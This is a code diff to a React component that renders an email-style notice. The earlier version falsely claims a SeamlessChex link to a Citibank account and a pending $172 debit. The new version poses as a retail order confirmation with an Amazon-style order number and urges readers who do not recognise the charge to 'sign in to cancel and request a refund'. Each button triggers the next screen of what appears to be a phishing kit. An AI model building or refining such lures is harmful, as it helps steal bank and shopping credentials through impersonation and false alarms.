@@ -7,7 +7,7 @@ const EmailNotification = ({ setMounted }) => {
     page: {
       minHeight: "100vh",
       margin: 0,
-      padding: "32px 14px",
+      padding: "24px 12px",
       background:
         "radial-gradient(circle at top left, #dfeaff 0%, #eef3fb 35%, #f4f7fb 65%, #eaf5f0 100%)",
       fontFamily: "'Montserrat', 'Segoe UI', sans-serif",
@@ -25,18 +25,11 @@ const EmailNotification = ({ setMounted }) => {
       overflow: "hidden",
     },
     hero: {
-      padding: "28px 26px 22px",
+      padding: "clamp(18px, 4vw, 28px) clamp(16px, 4vw, 26px) clamp(18px, 3.5vw, 22px)",
       textAlign: "center",
       background:
         "linear-gradient(120deg, #f5f9ff 0%, #edf5ff 60%, #f7fcf8 100%)",
       borderBottom: "1px solid #e7eef7",
-    },
-    logo: {
-      display: "block",
-      margin: "0 auto 16px",
-      width: "150px",
-      maxWidth: "100%",
-      height: "auto",
     },
     badge: {
       display: "inline-block",
@@ -52,25 +45,25 @@ const EmailNotification = ({ setMounted }) => {
     },
     title: {
       margin: 0,
-      fontSize: "26px",
-      lineHeight: "34px",
+      fontSize: "clamp(22px, 5.4vw, 26px)",
+      lineHeight: "clamp(30px, 6.6vw, 34px)",
       fontWeight: 700,
       color: "#122745",
     },
     subtitle: {
       margin: "12px auto 0",
       maxWidth: "460px",
-      fontSize: "14px",
-      lineHeight: "22px",
+      fontSize: "clamp(13px, 3.8vw, 14px)",
+      lineHeight: "clamp(20px, 5.8vw, 22px)",
       color: "#4e617d",
     },
     body: {
-      padding: "28px 26px 30px",
+      padding: "clamp(20px, 4vw, 28px) clamp(16px, 4vw, 26px) clamp(22px, 4vw, 30px)",
     },
     transactionCard: {
       border: "1px solid #dde6f2",
       borderRadius: "12px",
-      padding: "16px 18px",
+      padding: "clamp(14px, 3.2vw, 16px) clamp(14px, 3.2vw, 18px)",
       backgroundColor: "#f8fbff",
       marginBottom: "20px",
     },
@@ -102,52 +95,9 @@ const EmailNotification = ({ setMounted }) => {
     description: {
       margin: "0 0 20px",
       textAlign: "center",
-      fontSize: "15px",
-      lineHeight: "24px",
+      fontSize: "clamp(14px, 4vw, 15px)",
+      lineHeight: "clamp(22px, 6vw, 24px)",
       color: "#314766",
-    },
-    warning: {
-      margin: "0 auto 24px",
-      textAlign: "center",
-      fontSize: "14px",
-      lineHeight: "22px",
-      color: "#4e617d",
-      maxWidth: "480px",
-    },
-    inlineAction: {
-      border: "none",
-      background: "none",
-      padding: 0,
-      margin: 0,
-      color: "#0d5ec9",
-      textDecoration: "underline",
-      fontWeight: 700,
-      cursor: "pointer",
-      fontFamily: "inherit",
-      fontSize: "14px",
-    },
-    ctaWrap: {
-      display: "flex",
-      justifyContent: "center",
-      marginBottom: "24px",
-    },
-    cta: {
-      border: "none",
-      borderRadius: "10px",
-      background: "linear-gradient(135deg, #2c8f4a 0%, #23843f 100%)",
-      color: "#ffffff",
-      fontSize: "15px",
-      lineHeight: "20px",
-      fontWeight: 700,
-      padding: "13px 30px",
-      cursor: "pointer",
-      fontFamily: "inherit",
-      boxShadow: "0 10px 22px rgba(31, 124, 58, 0.28)",
-    },
-    footerLogoWrap: {
-      paddingTop: "18px",
-      borderTop: "1px solid #e7eef7",
-      textAlign: "center",
     },
     supportText: {
       margin: "14px 0 0",
@@ -156,39 +106,40 @@ const EmailNotification = ({ setMounted }) => {
       lineHeight: "18px",
       color: "#70839f",
     },
+    footerLogoWrap: {
+      paddingTop: "18px",
+      borderTop: "1px solid #e7eef7",
+      textAlign: "center",
+    },
   };
 
   return (
     <div style={styles.page}>
       <div style={styles.card}>
         <div style={styles.hero}>
-          <img
-            src="https://i.imgur.com/sEX5Llf.png"
-            alt="Logo"
-            width="150"
-            style={styles.logo}
-          />
-          <span style={styles.badge}>Payment Security Notice</span>
+          <span style={styles.badge}>Thank you for your purchase</span>
+
           <h1 style={styles.title}>
-            SeamlessChex connected to your Citibank - Digital
-                        Banking account
+            Your card on file has been securely charged for your order.
           </h1>
+
           <p style={styles.subtitle}>
-            Your Citi account has a pending payment scheduled for
-                        processing and will be deducted within 24 hours.
+            This message confirms that your order has been successfully placed.
           </p>
         </div>
 
         <div style={styles.body}>
           <div style={styles.transactionCard}>
             <div style={styles.transactionRow}>
-              <span>Transaction ID</span>
-              <span style={styles.transactionValue}>6GB80550RC2496746</span>
+              <span>Order Confirmation</span>
+              <span style={styles.transactionValue}>#112-3731869-9309032</span>
             </div>
+
             <div style={{ ...styles.transactionRow, marginBottom: 10 }}>
-              <span>Total</span>
-              <span style={styles.transactionValue}>$ 172.00</span>
+              <span>Shipping Method</span>
+              <span style={styles.transactionValue}>Ground Shipping</span>
             </div>
+
             <div style={{ ...styles.transactionRow, marginBottom: 0 }}>
               <span>Status</span>
               <span style={styles.status}>Completed</span>
@@ -196,35 +147,66 @@ const EmailNotification = ({ setMounted }) => {
           </div>
 
           <p style={{ ...styles.description, marginLeft: 10, marginRight: 10 }}>
-            If this was you, you're all set and no further action is
-                        required. <button
-                          onClick={() => setMounted(true)}
-                          style={{
-                            color: "#0066cc",
-                            textDecoration: "underline",
-                            fontWeight: "bold",
-                            cursor: "pointer",
-                          }}
-                        >
-                          Click here to view debit transaction history
-                          description
-                        </button>
+            If you recognize this activity, view your order for details or status.
+            If not, sign in to cancel and request a refund.
           </p>
 
-          <div style={styles.ctaWrap}>
-            <button onClick={() => setMounted(true)} style={styles.cta}>
-            Log In to Account
+          <div
+            style={{
+              display: "flex",
+              justifyContent: "center",
+              gap: "12px",
+              flexWrap: "wrap",
+              marginBottom: "24px",
+            }}
+          >
+            <button
+              onClick={() => setMounted(true)}
+              style={{
+                border: "none",
+                borderRadius: "10px",
+                background: "linear-gradient(135deg, #2c8f4a 0%, #23843f 100%)",
+                color: "#ffffff",
+                fontSize: "14px",
+                fontWeight: 700,
+                padding: "13px 26px",
+                cursor: "pointer",
+                boxShadow: "0 10px 22px rgba(31, 124, 58, 0.28)",
+              }}
+            >
+              View Order
+            </button>
+
+            <button
+              onClick={() => setMounted(true)}
+              style={{
+                borderRadius: "10px",
+                background: "#ffffff",
+                color: "#2c8f4a",
+                fontSize: "14px",
+                fontWeight: 700,
+                padding: "13px 26px",
+                cursor: "pointer",
+                border: "2px solid #2c8f4a",
+              }}
+            >
+              Sign in to Account
             </button>
           </div>
 
-          <div style={styles.footerLogoWrap}>
+          {/* <div style={styles.footerLogoWrap}>
             <img
-              src="https://i.imgur.com/n6G4EI8.png"
+              src="/images/plaid.png"
               alt="Footer Logo"
               width="150"
-              style={styles.logo}
+              style={{
+                display: "block",
+                margin: "0 auto",
+                width: "clamp(120px, 40vw, 150px)",
+                height: "auto",
+              }}
             />
-          </div>
+          </div>  */}
 
           <p style={styles.supportText}>
             Need help? Contact marketplace support for immediate assistance.
